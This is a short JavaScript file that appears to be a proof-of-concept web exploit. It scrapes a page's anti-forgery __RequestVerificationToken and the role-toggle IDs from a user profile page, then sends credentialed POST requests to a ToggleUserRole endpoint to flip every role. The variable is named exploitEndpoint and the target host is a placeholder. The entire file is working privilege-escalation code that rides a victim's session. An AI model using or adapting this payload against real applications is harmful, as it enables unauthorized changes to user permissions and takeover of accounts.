var host = "https://endpoint";
var exploitEndpoint = "/Organisation/ToggleUserRole/end1";
var valuesEndpoint = "/Organisation/UserProfile/end2";
var tokenEndpoint ='/Organisation';

var create_params;

async function getPowers() {
    try {
        // Fetch the token from the correct endpoint
        const token = await getToken();

        if (token) {
            // Fetch the HTML content from the valuesEndpoint
            const response = await fetch(host + valuesEndpoint);
            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }

            const html = await response.text();
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');

            // Iterate through each switch element
            const switchElements = doc.querySelectorAll('.toggleRole');
            switchElements.forEach(async switchElement => {
                const switchId = switchElement.id;
                create_params = "__RequestVerificationToken=" + token + "&roleId=" + switchId;
                await sendModify();
            });
        }
    } catch (error) {
        console.error('Error:', error);
    }
}

async function getToken() {
    try {
        // Fetch the token from the correct endpoint
        const response = await fetch(host + tokenEndpoint);
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const html = await response.text();
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const tokenInput = doc.querySelector('input[name="__RequestVerificationToken"]');

        if (tokenInput) {
            const token = tokenInput.value;
            return token;
        } else {
            throw new Error('Token input not found in the HTML.');
        }
    } catch (error) {
        console.error('Error:', error);
        return null;
    }
}

async function sendModify() {
    console.log("Changing Powers...");
    try {
        const response = await fetch(host + exploitEndpoint, {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: create_params
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        await isDone();
    } catch (error) {
        console.error('Error:', error);
    }
}

function isDone() {
    console.log("Done");
}

getPowers();

